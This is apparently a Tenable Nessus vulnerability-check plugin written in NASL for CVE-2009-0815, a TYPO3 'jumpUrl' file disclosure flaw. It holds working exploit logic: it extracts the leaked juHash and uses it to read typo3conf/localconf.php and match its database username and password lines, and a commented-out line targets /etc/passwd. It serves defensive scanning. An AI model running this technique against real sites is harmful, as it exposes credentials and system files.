#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(35655);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2015/09/24 23:21:21 $");

  script_cve_id("CVE-2009-0815");
  script_bugtraq_id(33714);
  script_osvdb_id(52048);
  script_xref(name:"EDB-ID", value:"8038");

  script_name(english:"TYPO3 'jumpUrl' Mechanism Information Disclosure");
  script_summary(english:"Attempts to read 'typo3conf/localconf.php'.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The 'jumpUrl' mechanism in the version of TYPO3 installed on the
remote host, which is used to track access, exposes the value of a
hash secret used to validate requests. An unauthenticated, remote
attacker can leverage this issue to view the contents of arbitrary
files on the remote host subject to the privileges of the web server
user id.");
  # http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-sa-2009-002/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0d08a94c");
  script_set_attribute(attribute:"solution", value:
"Upgrade to TYPO3 version 4.0.12 / 4.1.10 / 4.2.6 or later, or patch
the installation as discussed in the project's advisory referenced
above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Typo3 FD");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
script_cwe_id(200);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/02/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:typo3:typo3");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("typo3_detect.nasl");
  script_require_keys("installed_sw/TYPO3","www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("url_func.inc");

app = "TYPO3";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(qs:dir, port:port);

# file = "/etc/passwd";
# file_pat = "root:.*:0:[01]:";
file = "typo3conf/localconf.php";
file_pat = "\$typo_db_(password|username) *=";

# Call up the registration page.
url =
  "/?" +
  "jumpurl=" + urlencode(str:file) + "&" +
  "juSecure=1&" +
  "type=0&" +
  "locationData=" + urlencode(str:"3:");

res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);

# Grab the hash.
juhash = NULL;

pat = "Calculated juHash, ([a-z0-9]+), did not";
matches = egrep(pattern:pat, string:res[2]);
if (matches)
{
  foreach match (split(matches, keep:FALSE))
  {
    item = eregmatch(pattern:pat, string:match);
    if (!empty_or_null(item[1]))
    {
      juhash = item[1];
      break;
    }
  }
}
if (empty_or_null(juhash)) exit(0, "Unable to extract juHash from "+ install_url + url);

# Now read the file.
url2 = url + "&juHash=" + juhash;

res2 = http_send_recv3(method:"GET", item:dir+url2, port:port, exit_on_fail:TRUE);

# There's a problem if we see the expected contents.
if (egrep(pattern:file_pat, string:res2[2]))
{
  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to exploit the issue to retrieve the contents of' +
      '\n' + "'" + file + "'" + ' on the remote host using the following URLs :' +
      '\n' +
      '\n' + '  ' + install_url + url + 
      '\n' + '  ' + install_url + url2 + 
      '\n';
    if (report_verbosity > 1)
    {
      snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report +=
        '\n' + 'Here are its contents :\n' +
        '\n' + snip +
        res2[2] + '\n' +
        snip;
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);

  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
